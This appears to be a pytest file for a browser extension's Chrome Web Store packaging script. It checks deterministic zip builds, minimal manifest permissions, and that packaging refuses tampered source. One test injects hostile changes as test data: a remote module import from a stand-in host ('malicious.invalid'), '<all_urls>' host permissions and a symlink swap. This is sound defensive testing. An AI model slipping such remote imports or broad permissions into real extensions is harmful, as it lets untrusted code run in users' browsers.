"""SP145: audited first-party Chrome Web Store draft release package.

No browser install, publisher credential, network access or employer request.
"""
from __future__ import annotations

from hashlib import sha256
import importlib.util
import json
from pathlib import Path
import shutil
import subprocess
import sys
import zipfile

import pytest

ROOT = Path(__file__).resolve().parents[1]
PACKAGER = ROOT / "web/scripts/package_companion.py"
SOURCE = ROOT / "browser-companion"


def packager_module():
    spec = importlib.util.spec_from_file_location("smartploy_store_packager", PACKAGER)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def test_store_zip_reuses_exact_audited_source_deterministically(tmp_path):
    packager = packager_module()
    first = tmp_path / "a" / "smartploy-apply-companion-store.zip"
    second = tmp_path / "b" / "smartploy-apply-companion-store.zip"
    digest = packager.make_store_zip(first)
    assert packager.make_store_zip(second) == digest
    assert first.read_bytes() == second.read_bytes()
    assert digest == sha256(first.read_bytes()).hexdigest()
    assert first.with_name(first.name + ".sha256").read_text() == (
        f"{digest}  {first.name}\n"
    )
    with zipfile.ZipFile(first) as bundle:
        assert bundle.namelist() == sorted(packager.FILES)
        assert bundle.testzip() is None
        assert "INSTALL.txt" not in bundle.namelist()
        assert "SHA256SUMS.txt" not in bundle.namelist()
        assert all("tests/" not in name and ".." not in name for name in bundle.namelist())
        for item in packager.FILES:
            assert bundle.read(item) == (SOURCE / item).read_bytes()
        manifest = json.loads(bundle.read("manifest.json"))
        assert manifest["manifest_version"] == 3
        assert manifest["permissions"] == ["activeTab", "scripting", "storage"]
        assert manifest["version"] == "0.5.1"
        assert not any(k in manifest for k in (
            "host_permissions", "background", "content_scripts",
            "externally_connectable", "update_url",
        ))


def test_store_cli_prepares_review_only_bundle_not_public_web_asset(tmp_path):
    target = tmp_path / "smartploy-apply-companion-store.zip"
    result = subprocess.run(
        [sys.executable, str(PACKAGER), "--store-output", str(target)],
        check=True, capture_output=True, text=True, timeout=20,
    )
    assert "reviewed Web Store draft" in result.stdout
    assert target.stat().st_size > 50_000
    assert not (ROOT / "web/public/smartploy-apply-companion-store.zip").exists()


@pytest.mark.parametrize("attack", ["host_permissions", "remote_import", "symlink"])
def test_store_packaging_fails_closed_on_unreviewed_change(tmp_path, monkeypatch, attack):
    packager = packager_module()
    scratch = tmp_path / "companion"
    shutil.copytree(SOURCE, scratch)
    monkeypatch.setattr(packager, "SOURCE", scratch)
    if attack == "host_permissions":
        path = scratch / "manifest.json"
        manifest = json.loads(path.read_text())
        manifest["host_permissions"] = ["<all_urls>"]
        path.write_text(json.dumps(manifest))
    elif attack == "remote_import":
        path = scratch / "logic.mjs"
        path.write_text(path.read_text() + '\nimport "https://malicious.invalid/module.js";\n')
    else:
        path = scratch / "popup.css"
        path.unlink()
        path.symlink_to(scratch / "logic.mjs")
    output = tmp_path / "not-created.zip"
    with pytest.raises(ValueError):
        packager.make_store_zip(output)
    assert not output.exists()
